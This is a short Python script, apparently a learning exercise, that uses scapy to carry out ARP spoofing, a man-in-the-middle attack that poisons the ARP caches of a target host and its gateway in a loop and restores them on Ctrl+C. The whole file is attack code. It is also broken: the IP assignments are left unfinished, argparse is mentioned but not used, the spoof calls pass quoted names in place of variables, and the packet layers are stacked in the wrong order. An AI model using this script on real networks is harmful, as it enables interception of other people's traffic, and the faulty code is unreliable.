#!/usr/bin/env python

import scapy.all as scapy
import sys
import time


def get_mac(ip):
    ans, unans = scapy.srp(scapy.ARP(
        pdst=ip)/scapy.Ether(dst="ff:ff:ff:ff:ff:ff"), timeout=2, verbose=False)

    if ans:
        for a in ans:
            return a[1].hwsrc
    else:
        print("No response received.")


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    scapy.send(scapy.ARP(op=2, pdst=target_ip,
               hwdst=target_mac, psrc=spoof_ip), verbose=False)
    
def restore(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    scapy.send(scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac), count=4, verbose=False)

# Get target and gateway IPs from user input using argparse module
target_ip = # Request target IP from user
gateway_ip = # Request gateway IP from user

try:
    packets_sent_count = 0
    while True:
        spoof("target_ip", "gateway_ip")
        spoof("gateway_ip", "target_ip")
        packets_sent_count += 2
        print("\r[+] Sent " + str(packets_sent_count), end=""),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    restore("target_ip", "gateway_ip")
    restore("gateway_ip", "target_ip")
    print("\n[-] Detected CTRL + C ... Resetting ARP tables ... please wait!!!.\n")
